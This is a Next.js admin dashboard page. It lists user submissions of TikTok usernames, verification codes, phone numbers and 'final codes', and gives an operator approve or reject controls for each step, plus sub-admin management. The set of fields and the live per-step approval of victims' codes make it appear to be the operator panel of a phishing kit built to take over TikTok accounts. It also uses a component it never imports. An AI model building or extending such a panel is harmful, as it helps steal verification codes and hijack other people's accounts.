
import {
  CheckCircle,
  ShieldCheck,
  ShieldOff,
  User,
  Users,
  XCircle,
} from 'lucide-react';
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { format, formatDistanceToNow } from 'date-fns';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import type { Submission, AdminUser } from '@/lib/types';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { JsonStore } from '@/lib/json-store';
import { getSession } from '@/lib/session';
import { redirect } from 'next/navigation';
import { AdminApprovalForm } from '@/components/admin/admin-approval-form';
import { SubmissionApprovalActions } from '@/components/admin/submission-approval-actions';

async function getSubmissions(): Promise<Submission[]> {
  const store = new JsonStore<Submission[]>('src/data/submissions.json', []);
  const submissions = await store.read();
  return submissions.sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );
}

async function getAdmins() {
  const store = new JsonStore<AdminUser[]>('src/data/admins.json', []);
  const admins = await store.read();
  const safeAdmins = admins.map(({ passwordHash, ...rest }) => rest);
  return safeAdmins;
}

const getStatusBadge = (status: 'pending' | 'approved' | 'rejected') => {
  switch (status) {
    case 'approved':
      return (
        <Badge
          variant="default"
          className="bg-green-100 border-green-200 text-green-800"
        >
          Approved
        </Badge>
      );
    case 'rejected':
      return <Badge variant="destructive">Rejected</Badge>;
    case 'pending':
    default:
      return <Badge variant="secondary">Pending</Badge>;
  }
};

const getAdminRoleBadge = (isMainAdmin: boolean) => {
  if (isMainAdmin) {
    return <Badge variant="default">Main Admin</Badge>;
  }
  return (
    <Badge
      variant="secondary"
      className="border-blue-200 bg-blue-100 text-blue-800"
    >
      Sub-Admin
    </Badge>
  );
};

export default async function AdminPage() {
  const session = await getSession();
  if (!session.isLoggedIn || !session.user) {
    redirect('/admin/login');
  }
  const currentUser = session.user;
  const isMainAdmin = currentUser.isMainAdmin;

  const [submissions, admins] = await Promise.all([
    getSubmissions(),
    getAdmins(),
  ]);

  const totalSubmissions = submissions.length;
  const pendingSubmissions = submissions.filter(
    (s) =>
      s.tiktokUsernameStatus === 'pending' ||
      s.verificationCodeStatus === 'pending' ||
      s.phoneNumberStatus === 'pending' ||
      s.finalCodeStatus === 'pending'
  ).length;
  const totalAdmins = admins.length;
  const pendingAdmins = admins.filter((a) => !a.isVerified).length;

  return (
    <main className="flex flex-1 flex-col gap-4 p-4 md:gap-8 md:p-6">
      <div className="grid gap-4 md:grid-cols-2">
        <Card>
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium">
              Total Submissions
            </CardTitle>
            <Users className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{totalSubmissions}</div>
            <p className="text-xs text-muted-foreground">
              {pendingSubmissions} pending review
            </p>
          </CardContent>
        </Card>
        <Card>
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium">
              Administrators
            </CardTitle>
            <User className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{totalAdmins}</div>
            <p className="text-xs text-muted-foreground">
              {pendingAdmins} pending approval
            </p>
          </CardContent>
        </Card>
      </div>

      <Tabs defaultValue="submissions">
        <div className="flex items-center justify-between">
          <TabsList>
            <TabsTrigger value="submissions">User Submissions</TabsTrigger>
            <TabsTrigger value="admins">Admin Management</TabsTrigger>
          </TabsList>
        </div>
        <TabsContent value="submissions">
          <Card>
            <CardHeader>
              <CardTitle>User Submissions</CardTitle>
            </CardHeader>
            <CardContent>
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>User</TableHead>
                    <TableHead>Username</TableHead>
                    <TableHead>Verification Code</TableHead>
                    <TableHead>Phone Number</TableHead>
                    <TableHead>Final Code</TableHead>
                    <TableHead>Submitted</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {submissions && submissions.length > 0 ? (
                    submissions.map((sub) => (
                      <TableRow key={sub.id}>
                        <TableCell className="font-medium text-xs text-muted-foreground">
                          {sub.id}
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <span>@{sub.tiktokUsername}</span>
                            {getStatusBadge(sub.tiktokUsernameStatus)}
                            {sub.tiktokUsernameStatus === 'pending' && (
                              <SubmissionApprovalActions
                                id={sub.id}
                                step="tiktokUsername"
                              />
                            )}
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <span>{sub.verificationCode || '...'}</span>
                            {sub.verificationCode &&
                              getStatusBadge(sub.verificationCodeStatus)}
                            {sub.verificationCode &&
                              sub.verificationCodeStatus === 'pending' && (
                                <SubmissionApprovalActions
                                  id={sub.id}
                                  step="verificationCode"
                                />
                              )}
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <span>{sub.phoneNumber || '...'}</span>
                            {sub.phoneNumber &&
                              getStatusBadge(sub.phoneNumberStatus)}
                            {sub.phoneNumber &&
                              sub.phoneNumberStatus === 'pending' && (
                                <SubmissionApprovalActions
                                  id={sub.id}
                                  step="phoneNumber"
                                />
                              )}
                          </div>
                        </TableCell>
                        <TableCell>
                          <div className="flex items-center gap-2">
                            <span>{sub.finalCode || '...'}</span>
                            {sub.finalCode &&
                              getStatusBadge(sub.finalCodeStatus)}
                            {sub.finalCode &&
                              sub.finalCodeStatus === 'pending' && (
                                <SubmissionApprovalActions
                                  id={sub.id}
                                  step="finalCode"
                                />
                              )}
                          </div>
                        </TableCell>
                        <TableCell>
                          <span className="text-xs text-muted-foreground">
                            {formatDistanceToNow(new Date(sub.createdAt), {
                              addSuffix: true,
                            })}
                          </span>
                        </TableCell>
                      </TableRow>
                    ))
                  ) : (
                    <TableRow>
                      <TableCell colSpan={6} className="h-24 text-center">
                        No submissions found.
                      </TableCell>
                    </TableRow>
                  )}
                </TableBody>
              </Table>
            </CardContent>
          </Card>
        </TabsContent>
        <TabsContent value="admins">
          <Card>
            <CardHeader>
              <CardTitle>Administrator Management</CardTitle>
              <CardDescription>
                Approve or revoke administrator access.
              </CardDescription>
            </CardHeader>
            <CardContent>
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Email</TableHead>
                    <TableHead>Role</TableHead>
                    <TableHead>Registered</TableHead>
                    <TableHead>Status</TableHead>
                    <TableHead className="text-right">Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {admins && admins.length > 0 ? (
                    admins.map((admin) => (
                      <TableRow key={admin.id}>
                        <TableCell className="font-medium">
                          {admin.email}
                        </TableCell>
                        <TableCell>{getAdminRoleBadge(admin.isMainAdmin)}</TableCell>
                        <TableCell>
                          {format(new Date(admin.createdAt), 'PPP')}
                        </TableCell>
                        <TableCell>
                          {getStatusBadge(admin.isVerified ? 'approved' : 'pending')}
                        </TableCell>
                        <TableCell className="text-right">
                          {isMainAdmin && currentUser.id !== admin.id && (
                            <AdminApprovalForm
                              adminId={admin.id}
                              isVerified={admin.isVerified}
                            />
                          )}
                        </TableCell>
                      </TableRow>
                    ))
                  ) : (
                    <TableRow>
                      <TableCell colSpan={5} className="h-24 text-center">
                        No admins found.
                      </TableCell>
                    </TableRow>
                  )}
                </TableBody>
              </Table>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </main>
  );
}
